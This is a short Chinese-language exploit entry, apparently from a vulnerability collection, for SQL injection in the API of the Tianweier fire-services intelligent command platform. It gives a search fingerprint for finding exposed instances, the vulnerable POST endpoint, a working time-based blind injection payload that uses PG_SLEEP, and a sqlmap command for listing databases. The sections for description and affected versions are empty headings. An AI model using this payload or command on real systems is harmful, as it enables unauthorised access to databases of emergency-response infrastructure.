# 天维尔消防智能指挥平台API接口页面sql注入

- **系统**：天维尔消防智能指挥平台API接口页面　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="1997-2020 天维尔信息科技股份有限公司"`
- **请求**：`POST /twms-service-mfs/mfsNotice/page HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Content-Length: 103`

**请求体 / payload**
```
{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930')AND 5803=(SELECT 5803 FROM PG_SLEEP(3)) AND ('oJoi'='oJoi"},"hgubmt748n4":"="}

SQLMAP命令
python3 sqlmap.py -r payload.txt --technique=T --time-sec 3  --dbs -v 3 --level 5 --random-agent
```

**其他**
- 天维尔消防智能指挥平台API接口页面sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 天维尔消防智能指挥平台